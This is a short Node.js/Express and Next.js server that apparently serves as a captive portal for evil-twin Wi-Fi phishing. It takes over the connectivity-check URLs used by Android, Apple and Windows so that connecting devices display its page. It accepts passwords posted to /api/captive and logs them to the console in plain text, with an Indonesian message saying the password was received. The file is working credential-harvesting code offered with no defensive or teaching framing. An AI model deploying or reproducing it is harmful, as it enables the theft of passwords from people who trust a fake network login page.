const express = require("express");
const next = require("next");

const dev = process.env.NODE_ENV !== "production";
const app = next({ dev });
const handle = app.getRequestHandler();

app.prepare().then(() => {
  const server = express();

  server.use(express.json());

  server.post("/api/captive", (req, res) => {
    console.log("📩 Password diterima:", req.body.password);
    res.status(200).send("OK");
  });

  server.get("/generate_204", (req, res) => {
    return app.render(req, res, "/");
  });

  server.get("/hotspot-detect.html", (req, res) => {
    return app.render(req, res, "/");
  });

  server.get("/connecttest.txt", (req, res) => {
  return app.render(req, res, "/");
});

  server.get("/ncsi.txt", (req, res) => {
    return app.render(req, res, "/");
  });

  server.get("/", (req, res) => {
    return app.render(req, res, "/");
  });

  server.all(/.*/, (req, res) => {
    return handle(req, res);
  });

  server.listen(80, "0.0.0.0", (err) => {
    if (err) throw err;
    console.log("✅ Captive portal server is running");
  });
});
